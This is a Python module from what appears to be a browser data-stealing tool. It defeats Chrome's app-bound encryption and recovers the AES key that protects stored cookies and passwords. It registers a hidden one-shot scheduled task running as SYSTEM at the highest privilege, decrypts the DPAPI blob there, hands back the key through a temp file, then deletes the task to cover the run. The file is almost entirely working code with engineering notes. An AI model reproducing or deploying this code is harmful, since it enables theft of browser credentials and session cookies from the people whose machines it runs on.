"""SYSTEM-context DPAPI unwrap helper.

Chrome 133+ wraps its app-bound key with a DPAPI blob that only SYSTEM can open, so
the unwrap has to happen in a SYSTEM process. This module is that process: the agent
re-launches itself with ``--abe-unwrap <in> <out>`` through a one-shot scheduled
task, the helper writes the SYSTEM plaintext as hex, and the caller finishes the
unwrap under the current user.

The helper runs with no config, no archive and no logging configured. Everything it
needs is in argv.

Sequence, and the reason for each step:

1. ``app_bound_encrypted_key`` is base64 with a 4-byte ``APPB`` prefix. Strip it.
   The remainder is a DPAPI blob wrapped under SYSTEM.
2. A scheduled task registered ``/ru SYSTEM /rl HIGHEST`` runs this same executable
   with ``--abe-unwrap <workspace>``. It unwraps ``in.bin`` under SYSTEM and writes
   hex to ``out.hex``. One path, not two: schtasks caps ``/tr`` at 261 characters and
   two absolute paths under ``%TEMP%`` overflow it in a development tree.
3. That plaintext is usually itself a DPAPI blob wrapped under the current user:
   ``DPAPI`` prefix, strip 5, unwrap in-process to the 32-byte key.
4. Some Chrome builds hand back the 32 bytes with no prefix at all. That is version
   drift, not corruption, and it is used as-is. No length guessing beyond exactly 32.
"""

from __future__ import annotations

import hashlib
import os
import secrets
import shutil
import sys
import tempfile
import time
from pathlib import Path
from typing import Final

from . import loader, util, winapi

UNWRAP_FLAG: Final[str] = "--abe-unwrap"

_APP_BOUND_PREFIX: Final[bytes] = b"APPB"
_DPAPI_PREFIX: Final[bytes] = b"DPAPI"
_KEY_BYTES: Final[int] = 32

# The DPAPI blob magic. Current Chrome hands back the user-scoped blob with no
# ``DPAPI`` text prefix at all, so the magic is the only marker that says "unwrap
# this again under the current user". Measured on metal: 384 bytes, ``01 00 00 00 d0``.
_DPAPI_MAGIC: Final[bytes] = bytes.fromhex("01000000d08c9ddf0115d1118c7a00c04fc297eb")

_SOURCE_NAME: Final[str] = "in.bin"
_RESULT_NAME: Final[str] = "out.hex"

_TASK_PREFIX: Final[str] = "SABLE-ABE-"
_RESULT_TIMEOUT: Final[float] = 60.0
_POLL_INTERVAL: Final[float] = 0.2
_SCHTASKS_TIMEOUT: Final[float] = 30.0
_MAX_HELPER_BLOB: Final[int] = 1024 * 1024

# Absolute, for the same reason ``util._schtasks`` is: a bare name is resolved off PATH,
# and a task registered from a hijacked PATH entry runs somebody else's binary.
_SYSTEM32: Final[Path] = Path(os.environ.get("SYSTEMROOT") or r"C:\Windows") / "System32"

# schtasks refuses a /tr value longer than this. Measured on metal: a dev-mode
# command line of 300 characters fails with "Value for '/tr' option cannot be more
# than 261 character(s)" and the task is never registered. The helper therefore
# takes one directory instead of two file paths, and the workspace name is kept
# short, so the whole line lands near 220 in dev mode and near 150 frozen.
_MAX_COMMAND: Final[int] = 261


def helper_main(args: list[str]) -> int:
    """``args`` is ``entry.main``'s list, still carrying the flag. One path only."""
    rest = [item for item in args if item != UNWRAP_FLAG]
    if len(rest) != 1:
        return 2

    workspace = Path(rest[0])
    source = workspace / _SOURCE_NAME
    destination = workspace / _RESULT_NAME

    try:
        if source.stat().st_size > _MAX_HELPER_BLOB:
            return 3
        blob = source.read_bytes()
    except OSError:
        return 3

    plaintext = winapi.crypt_unprotect(blob)
    if plaintext is None:
        return 4

    try:
        destination.write_text(plaintext.hex(), encoding="ascii")
    except OSError:
        return 5

    # The task is one-shot; the helper removes it on the way out. The caller also
    # deletes it on the failure path, so this is belt and braces, not the only path.
    _delete_task(_task_name(source))
    return 0


def unwrap(app_bound_blob: bytes) -> bytes | None:
    """Full path: SYSTEM unwrap out of process, then the user unwrap in process.

    ``app_bound_blob`` is the base64-decoded value with the ``APPB`` prefix already
    stripped. Returns the 32-byte AES key, or None when any step fails.
    """
    if sys.platform != "win32":
        return None
    if not app_bound_blob:
        return None

    workspace = _workspace()
    source = workspace / _SOURCE_NAME
    result = workspace / _RESULT_NAME
    task = _task_name(workspace)

    try:
        try:
            source.write_bytes(app_bound_blob)
        except OSError:
            return None
        command = _command_line(workspace)
        if len(command) > _MAX_COMMAND:
            # Registering anyway would fail inside schtasks with a message about the
            # option rather than about the build, and the run would look like a
            # broken unwrap. Refuse here, where the cause is obvious.
            return None
        if not _register_task(task, command):
            return None
        if not _run_task(task):
            return None
        plaintext = _await_result(result)
    finally:
        _delete_task(task)
        shutil.rmtree(workspace, ignore_errors=True)

    return _reduce(plaintext)


def strip_prefix(value: bytes, prefix: bytes) -> bytes | None:
    """Remove a fixed prefix, or None. Callers must not guess with lengths."""
    if not value.startswith(prefix):
        return None
    return value[len(prefix):]


def _unwrap_key(blob: bytes) -> bytes | None:
    inner = winapi.crypt_unprotect(blob)
    if inner is None or len(inner) != _KEY_BYTES:
        return None
    return inner


def _reduce(plaintext: bytes | None) -> bytes | None:
    if plaintext is None:
        return None

    if plaintext.startswith(_DPAPI_PREFIX):
        return _unwrap_key(plaintext[len(_DPAPI_PREFIX):])

    # Current builds return the user-scoped blob with no text prefix: the SYSTEM
    # unwrap yields a bare DPAPI blob and its magic is the only marker.
    if plaintext.startswith(_DPAPI_MAGIC):
        return _unwrap_key(plaintext)

    # Version drift: some builds return the key with no DPAPI wrapper at all.
    if len(plaintext) == _KEY_BYTES:
        return plaintext

    return None


def _workspace() -> Path:
    """A short directory name. ``s`` plus eight hex characters, under ``%TEMP%``."""
    base = Path(tempfile.gettempdir())
    try:
        workspace = base / f"s{secrets.token_hex(4)}"
        workspace.mkdir()
        return workspace
    except OSError:
        return Path(tempfile.mkdtemp(prefix="s"))


def _task_name(workspace: Path) -> str:
    digest = hashlib.sha1(str(workspace).encode("utf-8", "replace")).hexdigest()[:12]
    return f"{_TASK_PREFIX}{digest}"


def _command_line(workspace: Path) -> str:
    if getattr(sys, "frozen", False):
        launcher = f'"{sys.executable}"'
    else:
        # ``pythonw.exe``, not ``python.exe``. The task action is a console program and
        # a console program started by the scheduler gets a console of its own; the GUI
        # subsystem twin of the same interpreter has no console to show. Measured on a
        # development tree: the task fired, the helper ran, and a black rectangle sat on
        # the desktop for the length of the unwrap.
        executable = Path(sys.executable)
        windowless = executable.with_name("pythonw.exe")
        runner = windowless if windowless.is_file() else executable
        launcher = f'"{runner}" "{Path(sys.argv[0]).resolve()}"'

    # The helper is a fresh process with a fresh command line, so a carrier container has
    # to be named again. Without it the helper's own boot looks for a tail on the
    # executable, which in carrier mode carries none, and the unwrap never starts. The
    # length check in ``unwrap`` is what catches the overflow this can cause; a helper that
    # cannot be described is an unavailable key rather than a broken run.
    carrier = "".join(f' "{item}"' for item in loader.carrier_args())
    return f'{launcher} {UNWRAP_FLAG} "{workspace}"{carrier}'


def _schtasks(arguments: list[str]) -> bool:
    tool = _SYSTEM32 / "schtasks.exe"
    completed = util.run_hidden([tool, *arguments], timeout=_SCHTASKS_TIMEOUT)
    return completed is not None and completed.returncode == 0


def _register_task(task: str, command: str) -> bool:
    # /sc once with a placeholder time is deliberate: the task is never allowed to
    # fire on a schedule, it is started immediately by /run and then deleted.
    return _schtasks(
        [
            "/create",
            "/tn",
            task,
            "/tr",
            command,
            "/sc",
            "once",
            "/st",
            "00:00",
            "/ru",
            "SYSTEM",
            "/rl",
            "HIGHEST",
            "/f",
        ]
    )


def _run_task(task: str) -> bool:
    return _schtasks(["/run", "/tn", task])


def _delete_task(task: str) -> bool:
    return _schtasks(["/delete", "/tn", task, "/f"])


def _await_result(result: Path) -> bytes | None:
    deadline = time.monotonic() + _RESULT_TIMEOUT
    while time.monotonic() < deadline:
        try:
            if result.is_file() and result.stat().st_size > 0:
                text = result.read_text(encoding="ascii", errors="strict").strip()
                if text:
                    return bytes.fromhex(text)
        except (OSError, ValueError):
            # Partially written file or a torn read; try again until the deadline.
            pass
        time.sleep(_POLL_INTERVAL)
    return None


__all__ = [
    "UNWRAP_FLAG",
    "helper_main",
    "strip_prefix",
    "unwrap",
]
